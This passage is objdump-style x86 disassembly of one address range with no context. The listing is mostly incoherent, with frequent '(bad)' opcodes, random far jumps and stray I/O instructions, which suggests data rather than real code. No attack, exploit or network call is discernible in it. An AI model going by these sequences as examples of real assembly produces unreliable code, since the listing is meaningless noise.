  4041f6:	lea    ecx,[ebx+0x5f]
  4041f9:	push   eax
  4041fa:	push   ebp
  4041fb:	adc    eax,0x56d1735d
  404200:	and    al,0x9c
  404202:	pop    ss
  404203:	add    DWORD PTR [ebx+ecx*8],esp
  404206:	push   ecx
  404207:	(bad)  
  404208:	sbb    DWORD PTR [eax+0x5a5b6bbc],eax
  40420e:	loop   0x404212
  404210:	mov    dl,0x5a
  404212:	daa    
  404213:	int3   
  404214:	adc    BYTE PTR [ebp+0x77827902],bh
  40421a:	rol    DWORD PTR [edi],1
  40421c:	mov    ebp,0xaf4b25bf
  404221:	sahf   
  404222:	xchg   ecx,eax
  404223:	(bad)  
  404224:	fmul   DWORD PTR ds:0x170a6f41
  40422a:	mov    ah,0x48
  40422c:	jle    0x404236
  40422e:	dec    eax
  40422f:	xor    al,0xa3
  404231:	ficom  DWORD PTR [ecx+0x95b7709]
  404237:	in     al,0x3d
  404239:	jp     0x4041f4
  40423b:	leave  
  40423c:	fld    QWORD PTR [edi-0x19]
  40423f:	add    al,0x36
  404241:	and    BYTE PTR [eax+edx*4-0x14],ch
  404245:	mov    dh,0x74
  404247:	lods   al,BYTE PTR ds:[esi]
  404248:	(bad)  
  404249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40424a:	and    edx,DWORD PTR [edi-0x9]
  40424d:	mov    bl,0xc8
  40424f:	pop    esp
  404250:	cmp    DWORD PTR [edx-0x2be07c3a],0x7db8359d
  40425a:	repnz out dx,eax
  40425c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40425d:	lock mov ebp,0x2e8e3e19
  404263:	push   es
  404264:	cmc    
  404265:	xchg   ebp,eax
  404266:	stc    
  404267:	cmp    eax,0xdacc8d82
  40426c:	gs jo  0x404296
  40426f:	stc    
  404270:	in     al,0x36
  404272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404273:	icebp  
  404274:	sti    
  404275:	dec    ecx
  404276:	xor    al,ah
  404278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404279:	cmp    DWORD PTR [ecx+esi*1+0x6fa33ac2],esi
  404280:	fs sti 
  404282:	inc    eax
  404283:	jno    0x404289
  404285:	mov    ds:0x11caa6eb,al
  40428a:	jo     0x4042c2
  40428c:	ret    
  40428d:	sar    BYTE PTR [eax+0x65],cl
  404290:	mov    cl,BYTE PTR [edx-0x4c5ead4]
  404296:	loopne 0x40425b
  404298:	call   FWORD PTR [edx-0x5899f62b]
  40429e:	in     al,dx
  40429f:	fs add ecx,edx
  4042a2:	dec    edx
  4042a3:	mov    WORD PTR [ebp-0x11ced659],?
  4042a9:	leavew 
  4042ab:	sti    
  4042ac:	cmp    eax,0x89ec5be5
  4042b1:	inc    ebx
  4042b2:	sbb    BYTE PTR ds:0xe3cab8b2,cl
  4042b8:	das    
  4042b9:	dec    edi
  4042ba:	and    DWORD PTR [ebp-0x1b888f14],ebx
  4042c0:	call   0x3b44:0x3e5d32f9
  4042c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042c8:	jnp    0x404306
  4042ca:	sub    eax,0x39b431d9
  4042cf:	pusha  
  4042d0:	mov    DWORD PTR [esi],edi
  4042d2:	call   0xd1ea7ee8
  4042d7:	ss test bl,ah
  4042da:	mul    DWORD PTR [ebx+esi*2]
  4042dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042de:	ja     0x40431b
  4042e0:	adc    eax,0x648a9ba7
  4042e5:	mov    ebp,0xc7ff4122
  4042ea:	push   ecx
  4042eb:	fisubr WORD PTR [eax+0x34]
  4042ee:	out    0x12,al
  4042f0:	outs   dx,BYTE PTR ds:[esi]
  4042f1:	mov    ds:0x2686d7d8,al
  4042f6:	xchg   ebp,eax
  4042f7:	pop    esi
  4042f8:	fwait
  4042f9:	dec    BYTE PTR [ebp+esi*2-0x70]
  4042fd:	mov    dl,0x56
  4042ff:	pop    eax
  404300:	lods   eax,DWORD PTR ds:[esi]
  404301:	pop    ss
  404302:	nop
  404303:	fs lock cmp eax,DWORD PTR ds:[ebp-0x6a59af7a]
  40430c:	retf   0x3244
  40430f:	fcomp  DWORD PTR [ecx+eiz*2]
  404312:	rol    DWORD PTR [eax-0x48],1
  404315:	cmp    DWORD PTR [edi-0x4c],esi
  404318:	pop    esp
  404319:	and    ch,dl
  40431b:	neg    DWORD PTR [ebx+0x20]
  40431e:	jp     0x404376
  404320:	sahf   
  404321:	xchg   esp,eax
  404322:	xor    BYTE PTR [ebx+0x77a46bcc],ch
  404328:	lahf   
  404329:	mov    bl,0xd7
  40432b:	inc    esp
  40432c:	inc    ecx
  40432d:	add    ah,dh
  40432f:	xor    al,0x5d
  404331:	lods   al,BYTE PTR ds:[esi]
  404332:	jge    0x40435e
  404334:	or     ah,al
  404336:	loop   0x404387
  404338:	mov    esi,0xf4b06f21
  40433d:	out    dx,al
  40433e:	mov    ds:0x5bc12c67,al
  404343:	sbb    BYTE PTR [ebp-0x2d],bl
  404346:	mov    ah,0xd7
  404348:	mov    cl,dl
  40434a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40434b:	adc    al,0xec
  40434d:	xor    ebx,DWORD PTR [edx]
  40434f:	les    esi,FWORD PTR [eax+esi*8-0x7b]
  404353:	ds pop ebx
  404355:	xchg   ecx,eax
  404356:	test   al,0x54
  404358:	push   ss
  404359:	mov    bh,0x18
  40435b:	add    edi,0xdd14cbf3
  404361:	dec    esp
  404362:	sbb    eax,DWORD PTR [ebx+ecx*1]
  404365:	nop
  404366:	and    bl,dl
  404368:	pop    ecx
  404369:	jge    0x40432b
  40436b:	loop   0x4043c4
  40436d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40436e:	xor    BYTE PTR [ebx-0x50],ah
  404371:	mov    BYTE PTR [ebp-0x7df7c956],dl
  404377:	(bad)  [edx+0x48]
  40437a:	sub    al,ah
  40437c:	int    0x91
  40437e:	iret   
  40437f:	lods   al,BYTE PTR ds:[esi]
  404380:	or     eax,0xcbefea7e
  404385:	(bad)  
  404386:	adc    ah,BYTE PTR [edx]
  404388:	mov    ecx,0xa555ee00
  40438d:	arpl   WORD PTR [edi+0x4b],bp
  404390:	or     BYTE PTR [edi+0x38],0xb7
  404394:	outs   dx,DWORD PTR ds:[esi]
  404395:	pop    edi
  404396:	xor    BYTE PTR [edi],al
  404398:	sbb    al,0xf5
  40439a:	mov    al,ds:0x13a13bf
  40439f:	clc    
  4043a0:	jecxz  0x404332
  4043a2:	xor    BYTE PTR [esi+0x39],0x1a
  4043a6:	fwait
  4043a7:	cli    
  4043a8:	adc    eax,DWORD PTR [edi+0x4d]
  4043ab:	and    esi,esi
  4043ad:	inc    esp
  4043ae:	jle    0x404359
  4043b0:	sar    DWORD PTR [edx+0x70b378d9],cl
  4043b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043b7:	inc    edx
  4043b8:	adc    dh,ah
  4043ba:	stc    
  4043bb:	mov    ah,0xbf
  4043bd:	bswap  edx
  4043bf:	sti    
  4043c0:	fist   DWORD PTR [ecx-0x61]
  4043c3:	and    BYTE PTR [esi-0x28],dh
  4043c6:	ja     0x404348
  4043c8:	dec    ebx
  4043c9:	out    0xb1,al
  4043cb:	dec    ebp
  4043cc:	adc    DWORD PTR [esi],0x504114e9
  4043d2:	xchg   BYTE PTR [ecx],ah
  4043d4:	repz in eax,0xaa
  4043d7:	inc    esp
  4043d9:	stos   DWORD PTR es:[edi],eax
  4043da:	xchg   esp,eax
  4043db:	fidivr WORD PTR [edx]
  4043dd:	xchg   esp,eax
  4043de:	add    al,BYTE PTR [ebx*4+0x19f3a952]
  4043e5:	and    BYTE PTR [ebp-0x17],0xc4
  4043e9:	adc    bh,BYTE PTR [edi]
  4043eb:	inc    ebp
  4043ec:	mov    ch,0xa7
  4043ee:	push   0xffffffa5
  4043f0:	(bad)  
  4043f1:	into   
  4043f2:	retf   
  4043f3:	pop    es
  4043f4:	das    
  4043f5:	or     DWORD PTR [esi-0x644948c9],0xf8138d17
  4043ff:	push   edx
  404400:	xor    DWORD PTR [ebx-0x2],edx
  404403:	pop    edi
  404404:	xchg   DWORD PTR [esi],ebx
  404406:	adc    eax,DWORD PTR [ebx+0xa6f025a]
  40440c:	fwait
  40440d:	push   es
  40440e:	ja     0x404428
  404410:	jno    0x40440e
  404412:	sub    dh,0x60
  404415:	or     ah,ah
  404417:	push   edx
  404418:	mov    gs:0x931310a1,al
  40441e:	pop    edx
  40441f:	dec    ebx
  404420:	cs push eax
  404422:	add    al,0xd3
  404424:	jl     0x40446c
  404426:	jmp    0xf686:0x3e1d082d
  40442d:	pop    ebx
  40442e:	fnsave [eax]
  404430:	nop
  404431:	cwde   
  404432:	ds push es
  404434:	cmp    edx,edi
  404436:	jge    0x40445a
  404438:	rcr    BYTE PTR [eax-0x4c],1
  40443b:	inc    esi
  40443c:	fld    TBYTE PTR [edx]
  40443e:	inc    ebx
  40443f:	sete   BYTE PTR [esi+eiz*2-0x57]
  404444:	cs xchg esp,eax
  404446:	xor    esi,DWORD PTR [ebx]
  404448:	(bad)  
  404449:	in     al,dx
  40444a:	fsub   DWORD PTR es:[ecx]
  40444d:	mov    gs,esi
  40444f:	inc    esi
  404450:	xchg   esi,eax
  404451:	jnp    0x4044a4
  404453:	es out dx,al
  404455:	fadd   QWORD PTR [ecx+0x34c562fb]
  40445b:	jns    0x40445a
  40445d:	mov    dh,BYTE PTR [edx-0x39]
  404460:	sub    BYTE PTR [esi+0x1c],dh
  404463:	inc    edx
  404464:	add    edx,edx
  404466:	les    esp,FWORD PTR [esi]
  404468:	aad    0x6d
  40446a:	push   0x27
  40446c:	jo     0x40446e
  40446e:	ret    
  40446f:	repz or ecx,0xffffffde
  404473:	push   ebp
  404474:	xor    ebx,DWORD PTR [ebp+0x18cfbe0b]
  40447a:	push   edi
  40447b:	aas    
  40447c:	jno    0x4044f9
  40447e:	std    
  40447f:	xchg   esi,eax
  404480:	out    dx,eax
  404481:	jle    0x404443
  404483:	mov    cl,0xc2
  404485:	shr    bh,0xa7
  404488:	jae    0x4044f8
  40448a:	sbb    eax,0x2693796
  40448f:	or     BYTE PTR [edx+0x693429cf],al
  404495:	mov    ah,BYTE PTR [ecx+0x45ff046e]
  40449b:	cmp    edi,DWORD PTR [ebp+0x43]
  40449e:	mov    WORD PTR [ebx-0x2ecfe427],ss
  4044a4:	pop    es
  4044a5:	cs push edi
  4044a7:	int3   
  4044a8:	and    edx,DWORD PTR [ecx-0x62]
  4044ab:	dec    eax
  4044ac:	and    DWORD PTR [ecx],ebp
  4044ae:	push   0xf74f85b
  4044b3:	mov    dl,0x83
  4044b5:	js     0x40445b
  4044b7:	pop    ecx
  4044b8:	iret   
  4044b9:	ins    BYTE PTR es:[edi],dx
  4044ba:	add    al,0x25
  4044bc:	pusha  
  4044bd:	ins    DWORD PTR es:[edi],dx
  4044be:	sbb    ebx,edi
  4044c0:	add    al,BYTE PTR [edx+0x9228a5b]
  4044c6:	mov    dh,ch
  4044c8:	imul   esi,eax,0x94d07b83
  4044ce:	int3   
  4044cf:	aad    0x71
  4044d1:	pop    ds
  4044d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044d3:	leave  
  4044d4:	or     ah,BYTE PTR [ecx]
  4044d6:	std    
  4044d7:	call   0xe4b5ef08
  4044dc:	and    esi,DWORD PTR [ebp+0x7dae94dc]
  4044e2:	push   ebp
  4044e3:	sti    
  4044e4:	push   ecx
  4044e5:	xor    BYTE PTR [ebx+0xdbd2d5f],dh
  4044eb:	jp     0x40453e
  4044ed:	push   ebx
  4044ee:	pop    eax
  4044ef:	imul   BYTE PTR [eax+0x2b]
  4044f2:	cmp    eax,0x5e8738d6
  4044f7:	sub    BYTE PTR [edx+0x7c],bh
  4044fa:	jae    0x40454b
  4044fc:	mov    ebp,0x5014d757
  404501:	add    DWORD PTR [edx+ebp*2+0x708cc711],ebx
  404508:	pop    es
  404509:	lahf   
  40450a:	int3   
  40450b:	mov    ebp,ss
  40450d:	cld    
  40450e:	daa    
  40450f:	lahf   
  404510:	rcl    BYTE PTR [ebx-0x4890e515],cl
  404516:	mov    BYTE PTR [eax],dl
  404518:	std    
  404519:	mov    ah,0xfc
  40451b:	test   eax,0xaa4655c5
  404520:	pop    ds
  404521:	shl    DWORD PTR [edi+eax*1],cl
  404524:	nop
  404525:	or     eax,0x16629bc9
  40452a:	int    0x22
  40452c:	std    
  40452d:	call   0xe8e8edfb
  404532:	adc    eax,0x5ae53ae3
  404537:	div    BYTE PTR [ebx+0xa]
  40453a:	aad    0xec
  40453c:	and    DWORD PTR [edx+0x4be2ae],ecx
  404542:	out    0xc0,eax
  404544:	in     al,0xa7
  404546:	jnp    0x40450f
  404548:	and    esi,DWORD PTR [esi+ebx*4+0x10]
  40454c:	out    0xd9,eax
  40454e:	cmp    al,0xb1
  404550:	mov    bh,0x87
  404552:	or     BYTE PTR [ebx+esi*1-0x55418546],ch
  404559:	pop    ebx
  40455a:	int    0x64
  40455c:	ins    DWORD PTR es:[edi],dx
  40455d:	(bad)  
  40455e:	das    
  40455f:	int3   
  404560:	repz and DWORD PTR [esi],0x97b5765b
  404567:	fsubr  st,st(0)
  404569:	add    eax,0x3ed653f6
  40456e:	dec    esi
  40456f:	xchg   esi,eax
  404570:	push   es
  404571:	js     0x40455e
  404573:	xchg   esp,eax
  404574:	imul   esp,DWORD PTR [eax-0x3d],0x99daf108
  40457b:	sbb    DWORD PTR [ebx+0x3a],edx
  40457e:	mov    eax,ds:0x4ad2848a
  404583:	(bad)  
  404584:	adc    ebp,DWORD PTR [ebx]
  404586:	fidiv  WORD PTR [ebx-0x4f]
  404589:	imul   eax,DWORD PTR [ebx],0xffffff86
  40458c:	retf   0x350
  40458f:	xor    al,0x8
  404591:	xor    ebx,DWORD PTR [ebx]
  404593:	gs (bad) 
  404595:	rol    DWORD PTR fs:0xba8ecb04,cl
  40459c:	dec    esp
  40459d:	mov    DWORD PTR [edi],ebp
  40459f:	int3   
  4045a0:	out    dx,al
  4045a1:	jmp    0x4045b9
  4045a3:	inc    eax
  4045a4:	inc    esi
  4045a5:	(bad)  
  4045a6:	(bad)  [edi]
  4045a8:	shr    BYTE PTR [edx],0x7d
  4045ab:	imul   ebx,DWORD PTR [ebx],0xffffffb0
  4045ae:	pop    es
  4045af:	dec    esp
  4045b0:	pop    ss
  4045b1:	xchg   DWORD PTR [edx+0x13de4918],edx
  4045b7:	stos   DWORD PTR es:[edi],eax
  4045b8:	(bad)  
  4045b9:	sbb    al,0xef
  4045bb:	xor    DWORD PTR [ebx],ebx
  4045bd:	xchg   esi,eax
  4045be:	sbb    esi,DWORD PTR [ecx]
  4045c0:	dec    ecx
  4045c1:	xchg   edi,eax
  4045c2:	fdivr  DWORD PTR [esi+0x75bb6b98]
  4045c8:	ds and al,0xfa
  4045cb:	fnstenv [edx]
  4045cd:	icebp  
  4045ce:	cmp    al,BYTE PTR [ecx+edi*2+0x729845d7]
  4045d5:	fsubr  st,st(1)
  4045d7:	imul   eax,DWORD PTR [ecx-0x3739dc0],0xfffffff6
  4045de:	out    dx,eax
  4045df:	bound  eax,QWORD PTR ds:0x91474b9a
  4045e5:	dec    eax
  4045e6:	add    BYTE PTR [esi],bh
  4045e8:	jge    0x40456e
  4045ea:	fadd   DWORD PTR [eax+0x3059dda2]
  4045f0:	lahf   
  4045f1:	or     eax,0xd95b3889
  4045f6:	(bad)  
  4045f7:	ja     0x40460a
  4045f9:	adc    al,0x26
  4045fb:	pop    ds
  4045fc:	cmp    edi,0xffffffea
  4045ff:	jo     0x404597
  404601:	mov    cl,0x85
  404603:	mov    bl,0xd
  404605:	scas   eax,DWORD PTR es:[edi]
  404606:	mov    ecx,0x8db2f20
  40460b:	ins    BYTE PTR es:[edi],dx
  40460c:	scas   al,BYTE PTR es:[edi]
  40460d:	stos   DWORD PTR es:[edi],eax
  40460e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40460f:	cdq    
  404610:	lods   eax,DWORD PTR ds:[esi]
  404611:	dec    eax
  404612:	sub    eax,0x517ed2b8
  404617:	and    al,0x46
  404619:	je     0x404687
  40461b:	adc    al,0x2e
  40461d:	out    0x41,eax
  40461f:	jno    0x4045d1
  404621:	into   
  404622:	scas   eax,DWORD PTR es:[edi]
  404623:	or     bh,bl
  404625:	adc    edx,DWORD PTR [esi+0x5d]
  404628:	jae    0x4045d7
  40462a:	arpl   WORD PTR [ebx],bx
  40462c:	gs adc al,0x32
  40462f:	shl    DWORD PTR [edi-0xd75e085],0x31
  404636:	add    al,dh
  404638:	jmp    0x5ff1128d
  40463d:	nop
  40463e:	jp     0x4046a7
  404640:	cmp    eax,0xf19faa7b
  404645:	ja     0x4045f5
  404647:	mov    edx,0xf2c47c02
  40464c:	shl    bl,1
  40464e:	xor    BYTE PTR [edx-0x4f461b0d],dl
  404654:	in     al,0x7f
  404656:	mov    dl,0xd9
  404658:	push   esi
  404659:	fwait
  40465a:	repnz daa 
  40465c:	cli    
  40465d:	xchg   edx,eax
  40465e:	enter  0x25ef,0x23
  404662:	repz xor edx,edx
  404665:	xchg   esi,eax
  404666:	cs gs inc esp
  404669:	xchg   esp,eax
  40466a:	sbb    edx,eax
  40466c:	pop    ebp
  40466d:	nop
  40466e:	inc    edi
  40466f:	pop    ss
  404670:	push   eax
  404671:	shr    DWORD PTR [ebp+0x7f],cl
  404674:	mov    WORD PTR [ecx+edx*4-0x78],fs
  404678:	inc    edx
  404679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40467a:	mov    esp,0xd274fe4c
  40467f:	xor    BYTE PTR ds:0xe9609699,ah
  404685:	cmp    dh,ah
  404687:	fisttp DWORD PTR [ecx]
  404689:	leave  
  40468a:	cmp    al,0xe9
  40468c:	cmp    DWORD PTR [esi],0xffffffe2
  40468f:	xor    dh,BYTE PTR [eax-0xe]
  404692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404693:	scas   eax,DWORD PTR es:[edi]
  404694:	jbe    0x40469a
  404696:	mov    ah,0x7a
  404698:	jp     0x4046b1
  40469a:	and    al,0x2a
  40469c:	daa    
  40469d:	inc    ecx
  40469e:	adc    bh,bh
  4046a0:	fucomp st(3)
  4046a2:	sahf   
  4046a3:	out    dx,al
  4046a4:	dec    ebp
  4046a5:	pop    esi
  4046a6:	xlat   BYTE PTR ds:[ebx]
  4046a7:	sub    esp,DWORD PTR ds:0x3365c54f
  4046ad:	cmp    ch,dh
  4046af:	cmc    
  4046b0:	fimul  DWORD PTR [edx-0x361f6c5b]
  4046b6:	aam    0xa8
  4046b8:	mov    ss,WORD PTR [ebx+0x1fcaf885]
  4046be:	jecxz  0x40472a
  4046c0:	addr16 mov bh,0x51
  4046c3:	xchg   esp,eax
  4046c4:	cmp    ebx,DWORD PTR [ebp+eax*8+0x5d]
  4046c8:	or     DWORD PTR [ecx+0x3e1a5cc9],ecx
  4046ce:	xchg   ecx,eax
  4046cf:	mov    ah,0x5c
  4046d1:	xchg   ecx,eax
  4046d2:	das    
  4046d3:	rcl    BYTE PTR [ecx+0x2d2c918c],0x56
  4046da:	test   BYTE PTR [ebp+0x67],ah
  4046dd:	fst    st(4)
  4046df:	dec    esi
  4046e0:	shr    DWORD PTR [ebx-0x63],0xb8
  4046e4:	mov    al,ds:0x1557cfba
  4046e9:	ja     0x4046c7
  4046eb:	sub    edx,DWORD PTR [ebp-0x3e]
  4046ee:	call   0xd311:0x5254964f
  4046f5:	rcr    DWORD PTR [ebx-0x5d],1
  4046f8:	in     eax,0x85
  4046fa:	sub    eax,0xbf04d32f
  4046ff:	mov    ah,BYTE PTR [edi]
  404701:	ret    
  404702:	jecxz  0x404690
  404704:	sbb    bh,BYTE PTR [eax-0x12]
  404707:	retf   
  404708:	pusha  
  404709:	fisubr WORD PTR [edx]
  40470b:	in     eax,0xf8
  40470d:	sub    dl,al
  40470f:	mov    cl,ah
  404711:	pop    ds
  404712:	xchg   esp,eax
  404713:	adc    ecx,DWORD PTR [edx]
  404715:	push   cs
  404716:	and    eax,0x1302bd41
  40471b:	stos   DWORD PTR es:[edi],eax
  40471c:	jb     0x40472e
  40471e:	inc    edx
  40471f:	xor    eax,edx
  404721:	adc    bh,ch
  404723:	sbb    bh,ch
  404725:	xor    ch,ch
  404727:	hlt    
  404728:	mov    ebp,0x2df5c447
  40472d:	in     eax,dx
  40472e:	and    BYTE PTR [ecx],bh
  404730:	adc    eax,esi
  404732:	push   ss
  404733:	jmp    0xb486:0xb6c4c121
  40473a:	cs xchg edx,eax
  40473c:	sub    dl,bl
  40473e:	xchg   ebx,ecx
  404740:	jno    0x404718
  404742:	xlat   BYTE PTR ds:[ebx]
  404743:	and    ecx,DWORD PTR [eax-0x6c6513be]
  404749:	or     ah,bl
  40474b:	cmp    eax,0x279182f7
  404750:	fs push ecx
  404752:	mov    edi,esi
  404754:	inc    esp
  404755:	sbb    edx,esp
  404757:	mov    eax,0x2d3d3a3e
  40475c:	cmp    bl,dh
  40475e:	jmp    0xd521f863
  404763:	mov    cl,0x11
  404765:	imul   esi,DWORD PTR [ebx+0x3caaabf8],0xffffffb9
  40476c:	fcmovnb st,st(0)
  40476e:	sub    cl,dh
  404770:	cmp    BYTE PTR [edx+esi*2+0x495bdf4],0xb0
  404778:	mov    BYTE PTR [ebx+0x4],dh
  40477b:	push   esp
  40477c:	mov    dh,0xc4
  40477e:	pop    ds
  40477f:	test   DWORD PTR ds:0x72116158,eax
  404785:	or     al,0xd8
  404787:	mov    ebp,0x634b75d2
  40478c:	das    
  40478d:	in     al,dx
  40478e:	sbb    eax,0x4761ba18
  404793:	push   0xa97274ec
  404798:	adc    eax,0xdaed7e43
  40479d:	inc    edx
  40479e:	push   ebx
  40479f:	xchg   edx,eax
  4047a0:	cmc    
  4047a1:	push   0xda48629a
  4047a6:	inc    esi
  4047a7:	jne    0x4047a8
  4047a9:	gs adc al,0xf
  4047ac:	add    al,0xd
  4047ae:	mov    al,0x68
  4047b0:	jnp    0x4047ec
  4047b2:	push   ecx
  4047b3:	maskmovq mm3,(bad)
  4047b4:	neg    DWORD PTR ds:0x3d408efe
  4047ba:	xor    BYTE PTR [esi-0xb],0x75
  4047be:	pop    ebx
  4047bf:	in     al,0x9c
  4047c1:	pushf  
  4047c2:	jb     0x40475b
  4047c4:	adc    al,0x3f
  4047c6:	sbb    al,0xd
  4047c8:	cmp    al,0xae
  4047ca:	icebp  
  4047cb:	std    
  4047cc:	cli    
  4047cd:	and    BYTE PTR [ebx-0x4e1941c],bl
  4047d3:	xor    DWORD PTR [esp+edx*8],ebp
  4047d6:	inc    ebx
  4047d7:	repz into 
  4047d9:	mov    ecx,0xd5fff5cc
  4047de:	sbb    al,0x80
  4047e0:	jg     0x4047b0
  4047e2:	xor    ecx,DWORD PTR [ecx+0x13791211]
  4047e8:	ja     0x4047a0
  4047ea:	mov    ds:0x3b240ff2,eax
  4047ef:	rcr    BYTE PTR [edi],cl
  4047f1:	and    edx,DWORD PTR [ebx+0x2b]
  4047f4:	cwde   
  4047f5:	adc    eax,0x20798c36
  4047fa:	pop    ss
  4047fb:	pop    eax
  4047fc:	pop    edi
  4047fd:	(bad)  
  4047fe:	nop
  4047ff:	sbb    edi,esi
  404801:	pusha  
  404802:	sub    BYTE PTR [edi],al
  404804:	sbb    al,BYTE PTR [ebp+0x40]
  404807:	and    bh,dh
  404809:	push   eax
  40480a:	mov    eax,ds:0x4e66850b
  40480f:	jg     0x4047e1
  404811:	inc    edi
  404812:	pop    es
  404813:	jmp    0x4805:0xcfcffc1
  40481a:	sbb    al,0x53
  40481c:	addr16 push ebp
  40481e:	lahf   
  40481f:	jae    0x4047d7
  404821:	jmp    0x4047dc
  404823:	aaa    
  404824:	push   ss
  404825:	push   ecx
  404826:	mov    ebx,es
  404828:	nop
  404829:	cmp    al,BYTE PTR [eax-0x110fe20b]
  40482f:	mov    ds:0x78d4eb95,eax
  404834:	int    0x42
  404836:	dec    edx
  404837:	and    eax,0x83394b34
  40483c:	mov    dh,0xad
  40483e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40483f:	std    
  404840:	jb     0x404859
  404842:	(bad)  
  404843:	mov    ch,0x69
  404845:	dec    eax
  404846:	shl    BYTE PTR [ecx-0x41905c08],0x81
  40484d:	jmp    0x50fd597f
  404852:	in     eax,dx
  404853:	sub    edi,DWORD PTR es:[ebx]
  404856:	pop    es
  404857:	pop    eax
  404858:	cld    
  404859:	ds into 
  40485b:	lock leave 
  40485d:	jmp    0x47270087
  404862:	pushf  
  404863:	sahf   
  404864:	sub    BYTE PTR [eax+0xefdd4a3],ah
  40486a:	lds    ebp,FWORD PTR [ebp-0x635846f0]
  404870:	test   eax,0x67399df7
  404875:	push   edi
  404876:	push   eax
  404877:	test   al,0x59
  404879:	pushf  
  40487a:	test   eax,0x67b5de47
  40487f:	leave  
  404880:	not    BYTE PTR [ebx+0x2c2340f7]
  404886:	lahf   
  404887:	dec    ecx
  404888:	and    eax,0xc524d3b3
  40488d:	push   edx
  40488e:	in     eax,0x11
  404890:	sar    DWORD PTR [ecx],0xe9
  404893:	fcmove st,st(7)
  404895:	sbb    al,0xe4
  404897:	inc    edx
  404898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404899:	mov    al,0xc5
  40489b:	jle    0x4048b9
  40489d:	push   es
  40489e:	mov    cl,0xf8
  4048a0:	adc    al,BYTE PTR [edx+0x55]
  4048a3:	or     ecx,DWORD PTR [ecx]
  4048a5:	std    
  4048a6:	or     ch,ah
  4048a8:	mov    bl,0x85
  4048aa:	sub    eax,0xdb42ae26
  4048af:	mov    eax,0xdfd36efd
  4048b4:	sbb    ebx,esp
  4048b6:	daa    
  4048b7:	ins    BYTE PTR es:[edi],dx
  4048b8:	ja     0x404876
  4048ba:	fwait
  4048bb:	out    0x40,eax
  4048bd:	dec    ebp
  4048be:	xor    BYTE PTR [edi],al
  4048c0:	int3   
  4048c1:	mov    DWORD PTR [edx+0xddd56d2],edi
  4048c7:	add    al,0x5d
  4048c9:	repnz pop es
  4048cb:	push   eax
  4048cc:	xchg   esp,eax
  4048cd:	hlt    
  4048ce:	es jle 0x404890
  4048d1:	xchg   esi,eax
  4048d2:	std    
  4048d3:	ret    0x6b44
  4048d6:	out    dx,eax
  4048d7:	enter  0x7aba,0xfa
  4048db:	pop    ds
  4048dc:	mov    DWORD PTR [ebx],ebx
  4048de:	mov    dl,dh
  4048e0:	scas   eax,DWORD PTR es:[edi]
  4048e1:	test   eax,0x194eb9e7
  4048e6:	fsubr  st(4),st
  4048e8:	push   ss
  4048e9:	stc    
  4048ea:	jmp    0x7168:0x96f819b3
  4048f1:	dec    edi
  4048f2:	or     DWORD PTR [ebp-0x3d374be7],esi
  4048f8:	jg     0x4048af
  4048fa:	in     eax,0x3d
  4048fc:	cli    
  4048fd:	(bad)  
  4048fe:	pop    ss
  4048ff:	jmp    0xdd4a:0x3d04
  404905:	cmp    DWORD PTR [edx-0x328a099e],edx
  40490b:	stc    
  40490c:	sub    BYTE PTR [eax-0x59],0xe9
  404910:	sahf   
  404911:	add    edx,ebx
  404913:	pop    es
  404914:	call   0x663b:0xd3b77058
  40491b:	(bad)  
  40491c:	mov    ebx,0xdf9e3893
  404921:	aad    0x2b
  404923:	lods   eax,DWORD PTR ds:[esi]
  404924:	sub    DWORD PTR [eax+0xda83c35],0xad4c72e3
  40492e:	ins    BYTE PTR es:[edi],dx
  40492f:	ins    BYTE PTR es:[edi],dx
  404930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404931:	out    0x90,eax
  404933:	shr    BYTE PTR [ebp+ecx*8+0x59],1
  404937:	aad    0xf5
  404939:	sbb    DWORD PTR ds:[ebx],ecx
  40493c:	hlt    
  40493d:	test   DWORD PTR [eax-0x15],ecx
  404940:	jae    0x4048e5
  404942:	and    eax,0x865667d9
  404947:	push   es
  404948:	daa    
  404949:	xor    DWORD PTR [ecx],esp
  40494b:	fcmovnbe st,st(0)
  40494d:	jae    0x404952
  40494f:	xchg   edx,eax
  404950:	aas    
  404951:	jno    0x40496a
  404953:	lahf   
  404954:	dec    edi
  404955:	pop    edx
  404956:	mov    esp,0x228b720a
  40495b:	jns    0x40498f
  40495d:	push   ebp
  40495e:	ret    
  40495f:	and    bl,0x96
  404962:	xor    eax,0x222e4e0c
  404967:	inc    esp
  404968:	fstp   QWORD PTR [edx]
  40496a:	mov    edx,0xc9419679
  40496f:	inc    esp
  404970:	adc    ch,ch
  404972:	push   es
  404973:	scas   eax,DWORD PTR es:[edi]
  404974:	in     eax,dx
  404975:	les    ebx,FWORD PTR [edi-0x26bfacd8]
  40497b:	ins    DWORD PTR es:[edi],dx
  40497c:	ss loop 0x404980
  40497f:	sub    DWORD PTR [edi],edi
  404981:	and    al,0x78
  404983:	dec    ebx
  404984:	jb     0x404927
  404986:	gs mov esp,0xafa9a47d
  40498c:	out    dx,al
  40498d:	sahf   
  40498e:	dec    edx
  40498f:	bound  eax,QWORD PTR [ebp+0x2d]
  404992:	nop
  404993:	adc    BYTE PTR [ebx+0x3e],ah
  404996:	pop    eax
  404997:	fsubp  st(3),st
  404999:	sbb    ch,ah
  40499b:	addr16 xchg edi,eax
  40499d:	shl    BYTE PTR [esi+ebp*8-0x23],1
  4049a1:	rol    bl,0x67
  4049a4:	xchg   esi,eax
  4049a5:	mov    bl,0xef
  4049a7:	sub    ebp,DWORD PTR [esi+0x6ac98cd6]
  4049ad:	(bad)  
  4049af:	cmp    eax,0xe87346fb
  4049b4:	bound  ecx,QWORD PTR [ecx]
  4049b6:	div    DWORD PTR [ebx+0x19]
